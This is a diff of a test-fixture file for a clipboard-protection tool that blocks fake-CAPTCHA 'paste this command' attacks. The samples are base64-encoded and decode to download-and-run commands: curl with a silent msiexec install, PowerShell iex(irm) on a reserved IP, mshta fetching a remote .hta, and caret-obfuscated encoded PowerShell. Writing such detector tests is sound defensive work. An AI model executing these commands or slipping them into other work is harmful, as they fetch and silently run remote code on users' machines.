@@ -2,7 +2,7 @@
   "note": "Shared test commands for the JavaScript engine and the PowerShell checker. Expected verdicts: block = replace the clipboard and warn; hold = pause programmatic copies so the user can choose 'Copy anyway'; allow = do nothing. Malicious samples only use reserved, non-routable hosts (example.invalid, *.example, 203.0.113.0/24) and harmless payloads.",
   "encoding": "Each command is stored base64-encoded (UTF-8). Antivirus programs scan files for attack text, and readable samples of disguised PowerShell made Microsoft Defender quarantine this file (Trojan:PowerShell/Obfuse). The tests decode them in memory. Read or add samples with: node scripts/samples.mjs",
   "block": {
-    "curl + silent msiexec (incident shape)": "Y21kIC9jIGN1cmwgLXMgLW8gJVRFTVAlXFM3NzUubXNpIGh0dHBzOi8vY2xvdWJmbGFyZS5leGFtcGxlLnRvcC81ICYmIG1zaWV4ZWMgL2kgJVRFTVAlXFM3NzUubXNpIC9xbg==",
+    "curl + silent msiexec": "Y21kIC9jIGN1cmwgLXMgLW8gJVRFTVAlXFM3NzUubXNpIGh0dHBzOi8vY2xvdWJmbGFyZS5leGFtcGxlLnRvcC81ICYmIG1zaWV4ZWMgL2kgJVRFTVAlXFM3NzUubXNpIC9xbg==",
     "powershell with fake reCAPTCHA comment": "cG93ZXJzaGVsbCAtdyBoIC1ub3AgLWMgImlleChpcm0gaHR0cHM6Ly8yMDMuMC4xMTMuNy9hKSIgIyDinIUgSSBhbSBub3QgYSByb2JvdCAtIHJlQ0FQVENIQSBWZXJpZmljYXRpb24gSUQ6IDQ4MjE=",
     "mshta with fake Cloudflare comment": "bXNodGEgaHR0cHM6Ly92ZXJpZnktY2hlY2suZXhhbXBsZS50b3AvY2FwdGNoYS5odGEgIyBJIGFtIG5vdCBhIHJvYm90OiBDbG91ZGZsYXJlIFJheSBJRCA4ODEy",
     "caret-obfuscated encoded powershell": "Y15tXmQgL2MgcF5vXndeZV5yXnNeaF5lXmxebCAtdyAxIC1lbmMgU1FCRkFGZ0FJQUFvQUdrQWNnQnRBQ0FBYUFCMEFIUUFjQUJ6QURvQUx3QXZBR1VBZUFCaEFHMEFjQUJzQUdVQQ==",
